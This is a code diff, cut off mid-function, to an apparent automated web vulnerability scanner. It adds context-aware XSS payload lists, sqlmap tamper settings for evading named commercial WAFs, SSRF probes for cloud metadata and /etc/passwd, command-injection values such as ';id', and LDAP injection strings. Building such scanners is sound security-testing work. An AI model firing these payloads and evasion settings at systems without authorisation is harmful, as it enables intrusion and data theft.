@@ -19,6 +19,14 @@ try:
 except ImportError:
     oidc_discover = None
 
+# GraphQL schema recovery (optional)
+try:
+    from .graphql_schema_recovery import run_schema_recovery as graphql_schema_recovery
+    HAS_GRAPHQL_RECOVERY = True
+except ImportError:
+    HAS_GRAPHQL_RECOVERY = False
+    graphql_schema_recovery = None
+
 # Browser proof for XSS verification (optional - graceful degradation if unavailable)
 try:
     from .proof_of_exploit import prove_xss_headless, ExploitProof
@@ -127,10 +135,65 @@ def statistical_timing_test(
     }
 
 
-async def dalfox_one(url: str, quick_mode: bool = False, auth_session: Any | None = None) -> dict[str, Any]:
+def _parse_fragment_params(url: str) -> tuple[str, str, dict]:
+    """
+    Parse URL with potential fragment parameters (SPA hash routes).
+
+    Returns: (base_url, fragment_path, fragment_params)
+
+    Example: "http://example.com/#/search?q=test&page=1"
+    Returns: ("http://example.com/", "/search", {"q": ["test"], "page": ["1"]})
+
+    Example: "http://example.com/#!/user?id=123"
+    Returns: ("http://example.com/", "!/user", {"id": ["123"]})
+    """
+    parsed = urllib.parse.urlparse(url)
+    fragment = parsed.fragment or ""
+
+    if "?" in fragment:
+        frag_path, frag_query = fragment.split("?", 1)
+        frag_params = urllib.parse.parse_qs(frag_query, keep_blank_values=True)
+    else:
+        frag_path = fragment
+        frag_params = {}
+
+    base_url = urllib.parse.urlunparse(parsed._replace(fragment=""))
+    return base_url, frag_path, frag_params
+
+
+def _build_fragment_url(base_url: str, frag_path: str, frag_params: dict) -> str:
+    """
+    Reconstruct URL with fragment parameters.
+
+    Example: _build_fragment_url("http://example.com/", "/search", {"q": ["test"]})
+    Returns: "http://example.com/#/search?q=test"
+    """
+    if not frag_path:
+        return base_url
+    frag_query = urllib.parse.urlencode(frag_params, doseq=True)
+    if frag_query:
+        return f"{base_url}#{frag_path}?{frag_query}"
+    return f"{base_url}#{frag_path}"
+
+
+def _is_hash_route(url: str) -> bool:
+    """Check if URL uses SPA hash-based routing."""
+    parsed = urllib.parse.urlparse(url)
+    fragment = parsed.fragment or ""
+    return fragment.startswith("/") or fragment.startswith("!/")
+
+
+async def dalfox_one(
+    url: str,
+    quick_mode: bool = False,
+    auth_session: Any | None = None,
+    deep_domxss: bool | None = None
+) -> dict[str, Any]:
     """Run Dalfox XSS scanner on a single URL. Returns dict with findings and execution status."""
     dalfox_cmd = "/opt/tools/dalfox" if os.path.exists("/opt/tools/dalfox") else "dalfox"
     cmd = [dalfox_cmd, "url", url, "--silence", "--no-spinner", "--format", "json"]
+    if deep_domxss is None:
+        deep_domxss = os.environ.get("SCANNER_DALFOX_DEEP_DOMXSS", "").lower() in ("1", "true", "yes")
     cookie_str, header_lines = get_auth_sqlmap_context(auth_session)
     if cookie_str:
         cmd.extend(["--cookie", cookie_str])
@@ -144,12 +207,13 @@ async def dalfox_one(url: str, quick_mode: bool = False, auth_session: Any | Non
         cmd.extend([
             "--timeout", "60",
             "--delay", "50",
-            "--deep-domxss",  # Check for DOM-based XSS
             "--follow-redirects",
             "--skip-mining-all",  # Skip mining to speed up
         ])
+        if deep_domxss:
+            cmd.append("--deep-domxss")  # Check for DOM-based XSS (spawns headless browser)
         timeout = 180
-    out, err, rc = await run(cmd, timeout=timeout)
+    out, err, rc = await run(cmd, timeout=timeout, kill_process_group=bool(deep_domxss))
     findings: list[dict] = []
     scan_completed = rc == 0  # Tool executed successfully
     error = None
@@ -169,49 +233,120 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
     """
     Custom XSS detection using proven payloads and reflection analysis.
     Detects reflected XSS and indicators of potential DOM XSS.
+    Uses context-aware payload selection for improved accuracy.
+    Also tests fragment parameters for SPA hash routes (DOM XSS).
     """
     findings = []
     tested = 0
 
     parsed = urllib.parse.urlparse(url)
-    query_params = urllib.parse.parse_qs(parsed.query)
+    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
 
-    if not query_params:
+    # Also parse fragment parameters for hash routes
+    base_url, frag_path, frag_params = _parse_fragment_params(url)
+    is_hash_route = _is_hash_route(url)
+
+    if not query_params and not frag_params:
         return {"findings": [], "tested": 0, "vulnerable": False}
 
-    # XSS payloads organized by type
-    xss_payloads = [
-        # Basic reflection tests
+    # Context-specific XSS payloads - selected based on where input is reflected
+    CONTEXT_PAYLOADS = {
+        "in_script": [
+            # Inside <script> tags - need to break out or inject JS directly
+            ("</script><script>alert(1)</script>", "script_breakout"),
+            ("';alert(1);//", "js_string_single"),
+            ("\";alert(1);//", "js_string_double"),
+            ("\\';alert(1);//", "js_escape_single"),
+            ("-alert(1)-", "js_expression"),
+            ("`${alert(1)}`", "js_template_literal"),
+            ("</script><img src=x onerror=alert(1)>", "script_to_html"),
+        ],
+        "in_attribute": [
+            # Inside HTML attribute - break out of attribute
+            ("\" onmouseover=\"alert(1)", "attr_break_double"),
+            ("' onmouseover='alert(1)", "attr_break_single"),
+            ("\" onfocus=\"alert(1)\" autofocus=\"", "attr_autofocus_double"),
+            ("' onfocus='alert(1)' autofocus='", "attr_autofocus_single"),
+            ("\"><script>alert(1)</script>", "attr_to_script"),
+            ("'><img src=x onerror=alert(1)>", "attr_to_img"),
+        ],
+        "in_event_handler": [
+            # Inside onclick=, onmouseover=, etc. - inject JS directly
+            ("alert(1)", "event_direct"),
+            ("alert(1)//", "event_comment"),
+            ("');alert(1);//", "event_break_single"),
+            ("\");alert(1);//", "event_break_double"),
+            ("alert`1`", "event_template"),
+        ],
+        "in_angular": [
+            # Inside Angular/Vue {{ }} expressions
+            ("constructor.constructor('alert(1)')()", "angular_constructor"),
+            ("$on.constructor('alert(1)')()", "angular_on"),
+            ("$eval('alert(1)')", "angular_eval"),
+            ("{{7*7}}", "angular_expr_test"),
+            ("a])}})}}alert(1)//", "angular_sandbox_escape"),
+        ],
+        "in_svg": [
+            # Inside SVG elements
+            ("<animate onbegin=alert(1)>", "svg_animate"),
+            ("<set onbegin=alert(1)>", "svg_set"),
+            ("</svg><script>alert(1)</script>", "svg_breakout"),
+            ("<image href=1 onerror=alert(1)>", "svg_image"),
+            ("<foreignObject><script>alert(1)</script></foreignObject>", "svg_foreign"),
+        ],
+        "in_css": [
+            # Inside <style> or style="" - limited XSS vectors
+            ("</style><script>alert(1)</script>", "css_breakout"),
+            ("expression(alert(1))", "css_expression_ie"),
+            ("url('javascript:alert(1)')", "css_url_js"),
+        ],
+        "in_js_url": [
+            # Inside href="javascript:..." context
+            ("alert(1)", "jsurl_direct"),
+            ("alert(1)//", "jsurl_comment"),
+            ("',alert(1),'", "jsurl_break"),
+        ],
+        "in_url_path": [
+            # Inside URL path like src="/path/..."
+            ("javascript:alert(1)", "path_jsprotocol"),
+            ("data:text/html,<script>alert(1)</script>", "path_data_uri"),
+            ("//evil.com", "path_protocol_relative"),
+        ],
+        "in_json": [
+            # Inside JSON response - DOM XSS when rendered
+            ("</script><script>alert(1)</script>", "json_script_inject"),
+            ("<img src=x onerror=alert(1)>", "json_img_inject"),
+        ],
+        "in_html": [
+            # General HTML context - full tag injection
+            ("<script>alert(1)</script>", "script_tag"),
+            ("<img src=x onerror=alert(1)>", "img_onerror"),
+            ("<svg onload=alert(1)>", "svg_onload"),
+            ("<body onload=alert(1)>", "body_onload"),
+            ("<iframe src=\"javascript:alert(1)\">", "iframe_js"),
+            ("<input onfocus=alert(1) autofocus>", "input_focus"),
+            ("<marquee onstart=alert(1)>", "marquee_start"),
+        ],
+        "not_reflected": [],  # No payloads if not reflected
+    }
+
+    # Fallback payloads for unknown contexts or when context detection fails
+    FALLBACK_PAYLOADS = [
         ("<script>alert(1)</script>", "script_tag"),
         ("<img src=x onerror=alert(1)>", "img_onerror"),
-        ("<svg onload=alert(1)>", "svg_onload"),
-        ("<body onload=alert(1)>", "body_onload"),
+        ("\" onmouseover=\"alert(1)", "attr_event"),
+        ("' onfocus='alert(1)' autofocus='", "attr_focus"),
+        ("{{constructor.constructor('alert(1)')()}}", "angular_proto"),
+        ("{{7*7}}", "angular_expr"),
+    ]
 
-        # Filter bypass payloads
+    # Filter bypass payloads - tried after context-specific ones
+    BYPASS_PAYLOADS = [
         ("<ScRiPt>alert(1)</ScRiPt>", "case_bypass"),
         ("<img/src=x onerror=alert(1)>", "slash_bypass"),
         ("<svg/onload=alert(1)>", "svg_slash"),
         ("<<script>alert(1)</script>", "double_open"),
         ("<scr<script>ipt>alert(1)</scr</script>ipt>", "nested_tag"),
-
-        # Attribute context
-        ("\" onmouseover=\"alert(1)", "attr_event"),
-        ("' onfocus='alert(1)' autofocus='", "attr_focus"),
-        ("javascript:alert(1)", "javascript_proto"),
-
-        # Angular/AngularJS specific (Juice Shop uses Angular)
-        ("{{constructor.constructor('alert(1)')()}}", "angular_proto"),
-        ("{{$on.constructor('alert(1)')()}}", "angular_on"),
-        ("{{7*7}}", "angular_expr"),  # Detect Angular expression evaluation
-
-        # DOM-based indicators
-        ("<iframe src=\"javascript:alert(1)\">", "iframe_js"),
-        ("<a href=\"javascript:alert(1)\">click</a>", "anchor_js"),
-
-        # Event handler variations
-        ("<div onmouseover=alert(1)>hover</div>", "div_mouse"),
-        ("<input onfocus=alert(1) autofocus>", "input_focus"),
-        ("<marquee onstart=alert(1)>", "marquee_start"),
     ]
 
     # Canary string for reflection detection
@@ -255,12 +390,30 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
         # Check if canary is reflected
         canary_reflected = canary in canary_body
 
+        # CONTEXT-AWARE PAYLOAD SELECTION (P0-1 fix)
+        # Detect where the canary is reflected to select appropriate payloads
+        reflection_context = "not_reflected"
+        if canary_reflected:
+            reflection_context = detect_reflection_context(canary_body, canary)
+
+        # Select payloads based on detected context
+        if reflection_context == "not_reflected":
+            # Input not reflected - skip this parameter for reflected XSS
+            # but still test a few payloads in case of stored/blind XSS
+            xss_payloads = FALLBACK_PAYLOADS[:3]
+        elif reflection_context in CONTEXT_PAYLOADS:
+            # Use context-specific payloads first, then add bypass payloads
+            xss_payloads = CONTEXT_PAYLOADS[reflection_context] + BYPASS_PAYLOADS
+        else:
+            # Unknown context - use fallback
+            xss_payloads = FALLBACK_PAYLOADS + BYPASS_PAYLOADS
+
         # For JSON responses, check if value is reflected without encoding
         if is_json and canary_reflected:
             # JSON responses can still be dangerous if rendered unsafely
             pass
 
-        # Test each XSS payload
+        # Test each XSS payload (now context-aware)
         for payload, payload_type in xss_payloads:
             tested += 1
 
@@ -330,7 +483,59 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
                     "evidence": evidence,
                     "severity": severity,
                     "context": "html" if is_html else "json" if is_json else "unknown",
+                    "reflection_context": reflection_context,  # Added: precise context detection
                 })
+
+    # Test fragment parameters for hash routes (DOM XSS)
+    # These require browser-based verification since payloads execute client-side
+    if is_hash_route and frag_params and not HAS_XSS_PROOF:
+        print(f"[xss] Skipping hash route DOM XSS tests: Playwright not available", file=sys.stderr)
+    elif is_hash_route and frag_params and HAS_XSS_PROOF and prove_xss_headless:
+        # DOM XSS payloads specifically for fragment injection
+        DOM_XSS_PAYLOADS = [
+            ("<img src=x onerror=alert(1)>", "img_onerror"),
+            ("<svg onload=alert(1)>", "svg_onload"),
+            ("'-alert(1)-'", "js_expression"),
+            ("\"><img src=x onerror=alert(1)>", "attr_break_img"),
+        ]
+
+        for param_name in frag_params:
+            for payload, payload_type in DOM_XSS_PAYLOADS:
+                tested += 1
+
+                # Build test URL with payload in fragment parameter
+                test_frag_params = frag_params.copy()
+                test_frag_params[param_name] = [payload]
+                test_url = _build_fragment_url(base_url, frag_path, test_frag_params)
+
+                # Must use browser-based verification for DOM XSS
+                try:
+                    proof = await prove_xss_headless(
+                        url=base_url,
+                        param=param_name,
+                        payload=payload,
+                        screenshot_dir=None,
+                        fragment_path=frag_path,
+                        fragment_params=test_frag_params,
+                    )
+                    if proof and proof.proven:
+                        findings.append({
+                            "type": "DOM XSS (Hash Route)",
+                            "url": test_url,
+                            "parameter": param_name,
+                            "payload": payload,
+                            "payload_type": payload_type,
+                            "evidence": [f"Browser proof: {proof.technique}", f"Confidence: {proof.confidence}"],
+                            "severity": "high" if proof.confidence >= 0.9 else "medium",
+                            "context": "hash_route",
+                            "reflection_context": "dom_xss",
+                            "proof": proof.to_dict() if hasattr(proof, "to_dict") else None,
+                        })
+                        # Found vulnerability for this param, skip remaining payloads
+                        break
+                except Exception as e:
+                    # Browser proof failed, continue with other payloads
+                    pass
 
     return {
         "findings": findings,
@@ -634,6 +839,97 @@ DBMS_SQLMAP_CONFIG = {
     },
 }
 
+# WAF-specific tamper script configuration for SQLmap
+# Selected based on known bypass techniques for each WAF vendor
+WAF_TAMPER_CONFIG = {
+    "cloudflare": {
+        "tamper": ["space2comment", "randomcase", "between", "charencode"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.5,  # Cloudflare rate limiting
+    },
+    "akamai": {
+        "tamper": ["randomcase", "space2hash", "versionedmorekeywords", "charencode"],
+        "extra_args": ["--skip-waf"],
+        "delay": 1.0,  # Akamai aggressive rate limiting
+    },
+    "aws_waf": {
+        "tamper": ["space2comment", "charencode", "between", "randomcase"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.3,
+    },
+    "modsecurity": {
+        "tamper": ["charencode", "apostrophemask", "space2plus", "percentage", "modsecurityversioned"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.2,
+    },
+    "f5_bigip": {
+        "tamper": ["space2comment", "randomcase", "charencode", "between"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.5,
+    },
+    "sucuri": {
+        "tamper": ["space2comment", "randomcase", "charencode", "between", "apostrophemask"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.5,
+    },
+    "incapsula": {
+        "tamper": ["randomcase", "space2comment", "charencode", "appendnullbyte"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.8,
+    },
+    "barracuda": {
+        "tamper": ["space2plus", "randomcase", "charencode", "between"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.5,
+    },
+    "fortinet": {
+        "tamper": ["space2comment", "randomcase", "charencode"],
+        "extra_args": ["--skip-waf"],
+        "delay": 0.5,
+    },
+}
+
+
+def get_waf_tamper_scripts(waf_products: list[str], dbms_tamper: list[str] | None = None) -> tuple[list[str], float]:
+    """
+    Get optimal tamper scripts based on detected WAF products.
+
+    Combines WAF-specific and DBMS-specific tamper scripts, avoiding duplicates.
+    Returns (tamper_scripts, recommended_delay).
+    """
+    if not waf_products:
+        return dbms_tamper or [], 0.0
+
+    # Start with DBMS-specific tampers
+    tamper_set = set(dbms_tamper or [])
+    max_delay = 0.0
+
+    # Add WAF-specific tampers
+    for waf in waf_products:
+        waf_lower = waf.lower()
+        if waf_lower in WAF_TAMPER_CONFIG:
+            config = WAF_TAMPER_CONFIG[waf_lower]
+            tamper_set.update(config.get("tamper", []))
+            max_delay = max(max_delay, config.get("delay", 0.0))
+
+    # Prioritize most effective tampers first
+    priority_order = [
+        "space2comment", "charencode", "randomcase", "between",
+        "apostrophemask", "space2plus", "percentage", "modsecurityversioned",
+        "versionedmorekeywords", "space2hash", "appendnullbyte"
+    ]
+
+    ordered_tampers = []
+    for tamper in priority_order:
+        if tamper in tamper_set:
+            ordered_tampers.append(tamper)
+            tamper_set.remove(tamper)
+
+    # Add remaining tampers
+    ordered_tampers.extend(sorted(tamper_set))
+
+    return ordered_tampers, max_delay
+
 
 async def sqlmap_test(
     url: str,
@@ -646,8 +942,26 @@ async def sqlmap_test(
     auth_session: Any | None = None,
     param: str | None = None,
     dbms: str | None = None,
+    waf_products: list[str] | None = None,
 ) -> dict:
-    """Run SQLmap SQL injection scanner with DBMS-aware tuning. Returns dict with results and execution status."""
+    """Run SQLmap SQL injection scanner with DBMS-aware and WAF-aware tuning.
+
+    Args:
+        url: Target URL to test
+        quick_mode: Use fast, lightweight scanning
+        aggressive: Use aggressive settings with higher level/risk
+        method: HTTP method (GET, POST, etc.)
+        data: POST data
+        headers: Additional headers
+        cookie: Cookie string
+        auth_session: Authentication session
+        param: Specific parameter to test
+        dbms: Detected DBMS type (sqlite, mysql, postgresql, mssql, oracle)
+        waf_products: List of detected WAF products (cloudflare, akamai, etc.)
+
+    Returns:
+        Dict with scan results and execution status.
+    """
     cmd = ["sqlmap", "-u", url, "--batch", "--random-agent", "--answers=Y"]
     if method:
         cmd.extend(["--method", method])
@@ -662,6 +976,20 @@ async def sqlmap_test(
         cmd.extend(["--dbms", dbms_config["dbms"]])
         if dbms_config.get("extra_args"):
             cmd.extend(dbms_config["extra_args"])
+
+    # Get WAF-aware tamper scripts, combining with DBMS-specific ones
+    dbms_tamper = dbms_config.get("tamper", []) if dbms_config else []
+    waf_tamper, waf_delay = get_waf_tamper_scripts(waf_products or [], dbms_tamper)
+
+    # Add WAF-specific extra args (like --skip-waf)
+    if waf_products:
+        for waf in waf_products:
+            waf_lower = waf.lower()
+            if waf_lower in WAF_TAMPER_CONFIG:
+                waf_extra = WAF_TAMPER_CONFIG[waf_lower].get("extra_args", [])
+                for arg in waf_extra:
+                    if arg not in cmd:
+                        cmd.append(arg)
 
     cookie_str, header_lines = get_auth_sqlmap_context(auth_session)
     header_lines.extend(headers or [])
@@ -678,7 +1006,8 @@ async def sqlmap_test(
     elif aggressive:
         # Aggressive mode: higher level/risk, all techniques
         technique = dbms_config["technique"] if dbms_config else "BEUSTQ"
-        tamper_scripts = dbms_config.get("tamper", ["space2comment", "between"]) if dbms_config else ["space2comment", "between"]
+        # Use WAF-aware tamper scripts if WAF detected, otherwise DBMS tampers
+        tamper_scripts = waf_tamper if waf_tamper else (dbms_config.get("tamper", ["space2comment", "between"]) if dbms_config else ["space2comment", "between"])
         cmd.extend([
             "--level=5", "--risk=3",
             "--threads=4", "--timeout=60", "--retries=3",
@@ -686,6 +1015,9 @@ async def sqlmap_test(
         ])
         if tamper_scripts:
             cmd.extend([f"--tamper={','.join(tamper_scripts)}"])
+        # Add delay for WAF rate limiting bypass
+        if waf_delay > 0:
+            cmd.extend([f"--delay={waf_delay}"])
         # Only add prefix/suffix if not already set by DBMS config
         if not dbms_config or not dbms_config.get("extra_args"):
             cmd.extend(["--prefix=\"'))\"", "--suffix=\"--\""])
@@ -693,8 +1025,13 @@ async def sqlmap_test(
     else:
         technique = dbms_config["technique"] if dbms_config else "BEUST"
         cmd.extend(["--level=3", "--risk=2", "--threads=4", "--timeout=30", "--retries=2", f"--technique={technique}"])
-        if dbms_config and dbms_config.get("tamper"):
-            cmd.extend([f"--tamper={','.join(dbms_config['tamper'])}"])
+        # Use WAF-aware tamper scripts if WAF detected
+        tamper_scripts = waf_tamper if waf_tamper else (dbms_config.get("tamper", []) if dbms_config else [])
+        if tamper_scripts:
+            cmd.extend([f"--tamper={','.join(tamper_scripts)}"])
+        # Add delay for WAF rate limiting bypass
+        if waf_delay > 0:
+            cmd.extend([f"--delay={waf_delay}"])
         timeout = 300
     out, err, rc = await run(cmd, timeout=timeout)
     scan_completed = rc == 0  # Tool executed successfully
@@ -702,12 +1039,20 @@ async def sqlmap_test(
     error = None
     if rc != 0:
         error = (err or "Unknown error")[:500] if err else f"Exit code {rc}"
+
+    # Only report WAF bypass fields if tamper/delay were actually applied
+    # Quick mode never applies tamper scripts, so don't report them as used
+    actually_applied_tamper = [] if quick_mode else (waf_tamper if waf_tamper else (tamper_scripts if 'tamper_scripts' in dir() else []))
+    waf_bypass_was_applied = bool(waf_products and waf_tamper and not quick_mode)
+
     return {
         "scan_completed": scan_completed,
         "vulnerable": vulnerable,
         "summary": "possible SQLi" if vulnerable else "no clear evidence",
         "error": error,
-        "raw": (out or err or "")[-1200:]
+        "raw": (out or err or "")[-1200:],
+        "waf_bypass_applied": waf_bypass_was_applied,
+        "tamper_scripts_used": actually_applied_tamper,
     }
 
 
@@ -728,8 +1073,22 @@ async def sqlmap_test_context(
     auth_session: Any | None = None,
     param: str | None = None,
     dbms: str | None = None,
+    waf_products: list[str] | None = None,
 ) -> dict:
-    """Run sqlmap with full request context from an endpoint definition."""
+    """Run sqlmap with full request context from an endpoint definition.
+
+    Args:
+        endpoint: Endpoint definition with url, method, params, etc.
+        quick_mode: Use fast, lightweight scanning
+        aggressive: Use aggressive settings with higher level/risk
+        auth_session: Authentication session
+        param: Specific parameter to test
+        dbms: Detected DBMS type (sqlite, mysql, postgresql, mssql, oracle)
+        waf_products: List of detected WAF products (cloudflare, akamai, etc.)
+
+    Returns:
+        Dict with scan results.
+    """
     url = endpoint.get("url", "")
 
     # Resolve path parameters like {id} or :id
@@ -797,6 +1156,7 @@ async def sqlmap_test_context(
             auth_session=auth_session,
             param=target_param,
             dbms=dbms,
+            waf_products=waf_products,
         )
         result.update({"url": url, "method": method, "param": target_param})
         return result
@@ -822,6 +1182,7 @@ async def sqlmap_test_context(
         auth_session=auth_session,
         param=target_param,
         dbms=dbms,
+        waf_products=waf_products,
     )
     result.update({"url": url, "method": method, "param": target_param})
     return result
@@ -837,7 +1198,7 @@ async def custom_sqli_test(url: str) -> dict:
 
     # Parse URL to get base and parameter
     parsed = urllib.parse.urlparse(url)
-    query_params = urllib.parse.parse_qs(parsed.query)
+    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
 
     if not query_params:
         return {"findings": [], "tested": 0, "vulnerable": False}
@@ -1322,36 +1683,87 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
     return {"exposed_files": exposed[:20]}
 
 
-async def advanced_vuln_tests(base_url: str, exploit_level: str = "safe") -> dict[str, Any]:
+async def advanced_vuln_tests(
+    base_url: str,
+    exploit_level: str = "safe",
+    candidates: list[dict[str, Any]] | None = None,
+    auth_session: Any | None = None,
+) -> dict[str, Any]:
     import aiohttp
-    results: dict[str, Any] = {"ssrf": {"tested": False, "vulnerable": False, "evidence": []}, "xxe": {"tested": False, "vulnerable": False, "evidence": []}, "command_injection": {"tested": False, "vulnerable": False, "evidence": []}, "scan_completed": False}
+    results: dict[str, Any] = {
+        "ssrf": {"tested": False, "vulnerable": False, "evidence": [], "tested_endpoints": 0},
+        "xxe": {"tested": False, "vulnerable": False, "evidence": []},
+        "command_injection": {"tested": False, "vulnerable": False, "evidence": [], "tested_endpoints": 0},
+        "scan_completed": False,
+    }
+
+    if not candidates:
+        results["scan_completed"] = False
+        results["skipped"] = True
+        results["reason"] = "no_candidate_endpoints"
+        return results
+
     ssrf_payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:22", "file:///etc/passwd"]
-    for payload in ssrf_payloads[:1 if exploit_level == "safe" else 3]:
-        try:
-            async with aiohttp.ClientSession() as session:
-                test_params = {"url": payload, "target": payload, "host": payload}
-                async with session.get(base_url, params=test_params, timeout=aiohttp.ClientTimeout(total=5)) as resp:
-                    body = await resp.text()
-                    if "root:x:" in body or "instance-id" in body:
-                        results["ssrf"]["vulnerable"] = True
-                        results["ssrf"]["evidence"].append(f"Payload: {payload}")
-            results["ssrf"]["tested"] = True
-        except Exception:
-            pass
-    if exploit_level != "safe":
-        cmd_payloads = [";id", "|id", "$(id)", "`id`"]
-        for payload in cmd_payloads[:2]:
-            try:
-                async with aiohttp.ClientSession() as session:
-                    test_params = {"cmd": payload, "exec": payload}
-                    async with session.get(base_url, params=test_params, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+    cmd_payloads = [";id", "|id", "$(id)", "`id`"]
+
+    headers = {}
+    cookies = {}
+    try:
+        if auth_session and getattr(auth_session, "config", None):
+            headers = dict(getattr(auth_session.config, "headers", {}) or {})
+            cookies = dict(getattr(auth_session.config, "cookies", {}) or {})
+    except Exception:
+        headers = {}
+        cookies = {}
+
+    def _apply_payload(url: str, param: str, payload: str) -> str:
+        parsed = urllib.parse.urlparse(url)
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        params[param] = [payload]
+        new_query = urllib.parse.urlencode(params, doseq=True)
+        return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
+
+    ssrf_candidates = [c for c in candidates if c.get("type") == "ssrf"]
+    cmd_candidates = [c for c in candidates if c.get("type") == "cmd"]
+
+    async with aiohttp.ClientSession(headers=headers, cookies=cookies) as session:
+        # SSRF probes (only if we have candidate params)
+        for payload in ssrf_payloads[:1 if exploit_level == "safe" else 3]:
+            for candidate in ssrf_candidates[:10]:
+                try:
+                    test_url = _apply_payload(candidate["url"], candidate["param"], payload)
+                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                         body = await resp.text()
-                        if "uid=" in body and "gid=" in body:
-                            results["command_injection"]["vulnerable"] = True
-                            results["command_injection"]["evidence"].append(f"Payload: {payload}")
-                results["command_injection"]["tested"] = True
-            except Exception:
-                pass
+                        results["ssrf"]["tested"] = True
+                        results["ssrf"]["tested_endpoints"] += 1
+                        if "root:x:" in body or "instance-id" in body:
+                            results["ssrf"]["vulnerable"] = True
+                            results["ssrf"]["evidence"].append({
+                                "url": test_url,
+                                "payload": payload,
+                            })
+                except Exception:
+                    continue
+
+        # Command injection probes (only for non-safe exploit levels)
+        if exploit_level != "safe":
+            for payload in cmd_payloads[:2]:
+                for candidate in cmd_candidates[:10]:
+                    try:
+                        test_url = _apply_payload(candidate["url"], candidate["param"], payload)
+                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                            body = await resp.text()
+                            results["command_injection"]["tested"] = True
+                            results["command_injection"]["tested_endpoints"] += 1
+                            if "uid=" in body and "gid=" in body:
+                                results["command_injection"]["vulnerable"] = True
+                                results["command_injection"]["evidence"].append({
+                                    "url": test_url,
+                                    "payload": payload,
+                                })
+                    except Exception:
+                        continue
+
     results["scan_completed"] = True
     return results
 
@@ -1630,6 +2042,31 @@ async def nosql_injection_test_json_body(
             if test_out and ("<!DOCTYPE" in test_out[:200] or "<html" in test_out[:200].lower()):
                 continue
 
+            # Skip if response contains SQL database errors (not NoSQL)
+            # This prevents misclassifying SQL errors as NoSQL injection
+            # Note: patterns must be specific to SQL to avoid false negatives
+            test_out_lower = test_out.lower() if test_out else ""
+            sql_error_patterns = [
+                # Database product names
+                "sqlite", "mysql", "postgresql", "pg_query", "psql",
+                "mssql", "sql server",
+                # SQL-specific error codes/states
+                "sqlstate", "sqlexception",
+                # SQL syntax errors (must include SQL context)
+                "sql syntax", "sql statement", "sql query",
+                "near \"select\"", "near \"insert\"", "near \"update\"",
+                "near \"delete\"", "near \"from\"", "near \"where\"",
+                # Column/table errors (SQL-specific phrasing)
+                "no such column", "unknown column", "no such table",
+                "ambiguous column", "datatype mismatch",
+            ]
+            # Oracle errors: ORA-xxxxx format (e.g., ORA-00942, ORA-01017)
+            has_oracle_error = "ora-" in test_out_lower and any(
+                f"ora-{d}" in test_out_lower for d in "0123456789"
+            )
+            if test_out_lower and (has_oracle_error or any(p in test_out_lower for p in sql_error_patterns)):
+                continue  # This is a SQL database, not NoSQL
+
             # Check for behavioral differences
             is_vulnerable = False
             evidence_type = ""
@@ -1688,26 +2125,84 @@ async def nosql_injection_test_json_body(
     return results
 
 
-async def ldap_injection_test(url: str) -> dict[str, Any]:
-    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
-    payloads = ["*", "*)(&", "*)(uid=*", "*)(|(uid=*", "*))%00", ")(cn=))(|(cn=*", "*()|&'", "admin*", "admin*)((|userPassword=*)", "x' or name()='username' or 'x'='y"]
-    for payload in payloads:
-        test_url = f"{url}&ldap={urllib.parse.quote(payload)}" if "?" in url else f"{url}?ldap={urllib.parse.quote(payload)}"
-        out, err, rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "5", test_url], timeout=10)
-        results["payloads_tested"].append(payload)
-        if rc == 0 and out:
-            patterns = [r"javax\.naming\.(ldap\.)?LDAPException", r"com\.sun\.jndi\.ldap", r"ldap_bind:.*failed", r"ldap_search:.*failed", r"LDAP.*error.*0x\d+", r"Invalid DN syntax", r"malformed filter", r"LDAP injection detected"]
-            if "<!DOCTYPE" in out[:100] or "<html" in out[:100]:
-                continue
-            for pattern in patterns:
-                if re.search(pattern, out, re.IGNORECASE):
-                    results["vulnerable"] = True
-                    results["evidence"].append({"payload": payload, "response_snippet": out[:500]})
-                    break
+async def ldap_injection_test(
+    url: str,
+    params_to_test: list[str] | None = None,
+    auth_session: Any | None = None,
+    param_defaults: dict[str, Any] | None = None,
+    max_params: int = 5,
+    max_payloads: int = 6,
+) -> dict[str, Any]:
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "payloads_tested": [],
+        "tested_params": [],
+        "evidence": [],
+    }
+    payloads = [
+        "*", "*)(&", "*)(uid=*", "*)(|(uid=*", "*))%00", ")(cn=))(|(cn=*",
+        "*()|&'", "admin*", "admin*)((|userPassword=*)", "x' or name()='username' or 'x'='y"
+    ]
+    patterns = [
+        r"javax\.naming\.(ldap\.)?LDAPException", r"com\.sun\.jndi\.ldap",
+        r"ldap_bind:.*failed", r"ldap_search:.*failed", r"LDAP.*error.*0x\d+",
+        r"Invalid DN syntax", r"malformed filter", r"LDAP injection detected"
+    ]
+
+    auth_args = get_auth_curl_args(auth_session)
+    parsed = urllib.parse.urlparse(url)
+    base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+    if param_defaults:
+        for name, value in param_defaults.items():
+            if name not in base_params:
+                base_params[name] = [str(value)]
+
+    test_params = params_to_test or ["ldap"]
+    if params_to_test:
+        test_params = test_params[:max_params]
+    payloads_to_use = payloads if params_to_test is None else payloads[:max_payloads]
+    payloads_seen: set[str] = set()
+
+    for param in test_params:
+        if not param:
+            continue
+        results["tested_params"].append(param)
+        for payload in payloads_to_use:
+            payloads_seen.add(payload)
+            params = dict(base_params)
+            params[param] = [payload]
+            test_query = urllib.parse.urlencode(params, doseq=True)
